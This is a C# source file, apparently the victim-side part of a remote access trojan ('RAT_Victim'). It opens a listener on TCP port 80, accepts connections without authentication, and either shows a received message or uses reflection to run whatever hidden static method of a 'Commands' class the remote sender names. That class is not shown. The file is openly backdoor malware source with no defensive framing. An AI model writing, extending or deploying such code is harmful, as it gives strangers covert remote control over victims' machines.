using System;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Text;

namespace RAT_Victim
{
    class Program
    {
        public static Socket client;
        static Encoding encoding = Encoding.GetEncoding(1251);

        static void Main(string[] args)
        {
            StartServer();
        }

        static void StartServer()
        {
            Socket server = new Socket(SocketType.Stream, ProtocolType.Tcp);
            server.Bind(new IPEndPoint(IPAddress.Any, 80));
            server.Listen(0);

            while (true)
            {
                client = server.Accept();
                byte[] buffer = new byte[64];
                int byteCount = client.Receive(buffer);
                string command = encoding.GetString(buffer, 0, byteCount);
                const string prefix = "Message: ";
                if (command.StartsWith(prefix))
                    Commands.ShowMessage(command.Replace(prefix, ""));
                else
                    typeof(Commands).GetMethod(command, BindingFlags.Static | BindingFlags.NonPublic).Invoke(null, null);
            }
        }
    }
}
